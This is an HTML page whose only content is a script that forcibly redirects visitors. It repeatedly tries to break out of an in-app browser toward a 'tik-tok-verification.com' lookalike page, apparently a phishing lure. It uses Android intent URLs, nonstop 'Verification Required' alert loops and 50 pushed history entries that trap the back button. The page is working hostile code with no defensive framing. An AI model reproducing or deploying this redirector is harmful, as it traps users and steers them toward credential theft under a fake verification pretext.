<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    let testMode = true;

    // --- TEST SAFETY: Stops the alerts after 5 seconds ---
    setTimeout(() => { testMode = false; }, 5000); 

    // 1. THE BREAKOUT ENGINE (Non-stop background attempts)
    function breakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        if (isAndroid) {
            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;
        } else {
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
            window.location.href = target;
        }
        setTimeout(breakout, 100); // 10 attempts per second
    }

    // 2. THE ALERT LOCK
    function startAlerts() {
        if (testMode) {
            alert("Verification Required\n\nClick OK to launch secure browser.");
            setTimeout(startAlerts, 5); 
        }
    }

    // 3. START EVERYTHING
    window.onload = () => {
        breakout();
        startAlerts();
        
        // Back-button treadmill
        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
    };

    // Re-trigger if they try to touch the UI/X-button area
    window.onblur = () => { if(testMode) startAlerts(); };
</script>

</body>
</html>
